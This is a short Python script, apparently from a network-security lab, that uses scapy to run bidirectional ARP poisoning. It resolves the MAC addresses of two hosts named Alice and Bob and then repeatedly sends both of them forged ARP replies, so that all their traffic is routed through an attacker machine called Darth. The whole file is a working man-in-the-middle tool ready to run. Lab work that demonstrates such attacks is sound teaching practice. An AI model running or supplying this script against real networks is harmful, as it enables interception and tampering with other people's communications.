"""
arp.py — run on Darth (attacker)
Bidirectional ARP poisoning: tells Alice that Darth is Bob,
and tells Bob that Darth is Alice.

Both victims update their ARP cache with Darth's MAC address,
routing all traffic through the attacker (Man-in-the-Middle).

Usage:
    sudo python3 arp.py
    sudo python3 arp.py --alice-ip 10.0.0.10 --bob-ip 10.0.0.20

MAC addresses are resolved automatically via ARP.
"""
from scapy.all import *
import typer
from rich.console import Console

console = Console()


def resolve_mac(ip: str) -> str:
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    if not ans:
        console.print(f"[red]ERROR:[/red] could not resolve MAC for {ip}")
        raise SystemExit(1)
    return ans[0][1].hwsrc


def main(
    alice_ip:   str = "10.0.0.10",
    bob_ip:     str = "10.0.0.20",
    interval:   float = typer.Option(0.5, help="Seconds between poison bursts"),
):
    console.print(f"Resolving MAC addresses...")
    alice_mac = resolve_mac(alice_ip)
    bob_mac   = resolve_mac(bob_ip)
    darth_mac = get_if_hwaddr(conf.iface)
    console.print(f"  Alice  {alice_ip} -> {alice_mac}")
    console.print(f"  Bob    {bob_ip}   -> {bob_mac}")
    console.print(f"  Darth  (me)       -> {darth_mac}")
    console.print(f"[red]ARP Poisoning started[/red]")
    console.print(f"  Alice  {alice_ip} <- told Darth ({darth_mac}) is Bob ({bob_ip})")
    console.print(f"  Bob    {bob_ip}   <- told Darth ({darth_mac}) is Alice ({alice_ip})")
    console.print("[yellow]Press Ctrl+C to stop.[/yellow]")

    # Tell Alice: "I (Darth) have Bob's IP"
    alice_poison = (
        Ether(src=darth_mac, dst=alice_mac) /
        ARP(op=2, hwsrc=darth_mac, psrc=bob_ip, hwdst=alice_mac, pdst=alice_ip)
    )

    # Tell Bob: "I (Darth) have Alice's IP"
    bob_poison = (
        Ether(src=darth_mac, dst=bob_mac) /
        ARP(op=2, hwsrc=darth_mac, psrc=alice_ip, hwdst=bob_mac, pdst=bob_ip)
    )

    with console.status("Poisoning ARP caches..."):
        sendp([alice_poison, bob_poison], loop=1, inter=interval, verbose=0)


if __name__ == "__main__":
    typer.run(main)
